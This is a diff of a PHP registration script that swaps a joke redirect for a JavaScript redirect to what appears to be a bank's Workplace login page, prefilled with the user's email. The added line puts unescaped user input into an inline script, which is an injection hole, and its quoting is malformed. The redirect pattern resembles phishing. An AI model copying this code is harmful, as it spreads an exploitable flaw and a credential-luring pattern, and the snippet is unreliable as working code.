@@ -57,7 +57,7 @@ if (mysqli_connect_errno()) {
         mysqli_stmt_execute($stmt);
 
         $_SESSION['success'] = "You are now registered";
-        echo "<script>window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';</script>";
+        echo "<script>window.location.href = 'https://xacbank.workplace.com/login/input/?identifier='".$email.";</script>";
         header('location: index.php');
     // }
 // }
